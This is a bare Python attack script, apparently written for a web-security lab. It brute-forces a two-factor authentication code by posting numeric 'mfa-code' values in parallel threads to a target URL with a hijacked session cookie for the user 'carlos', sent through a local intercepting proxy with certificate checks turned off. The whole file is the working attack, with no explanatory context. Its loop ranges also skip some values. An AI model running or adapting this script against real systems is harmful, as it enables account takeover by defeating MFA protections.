import requests;import urllib;import urllib3;import sys; from threading import Thread

proxies = {'http': "127.0.0.1:8080", 'https': "127.0.0.1:8080"}
cookies = {'verify': "carlos", 'session': "3xEdESqgjRDGlqSQzGEQArQXUM4ov2Kc"}
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def brute(start, end):
    url = sys.argv[1]
    for i in range(start, end):
        sys.stdout.write(".")
        response = requests.post(url, cookies=cookies, proxies=proxies, data={'mfa-code': str(i)}, verify=False)
        if response.status_code != 200:
            print(i)
            break

def main():
    Thread(target=brute, args=(0, 500)).start()
    Thread(target=brute,  args=(501, 1000)).start()
    Thread(target=brute,  args=(1001, 1500)).start()
    Thread(target=brute,  args=(1501, 2000)).start()
if __name__ == "__main__":
    main()
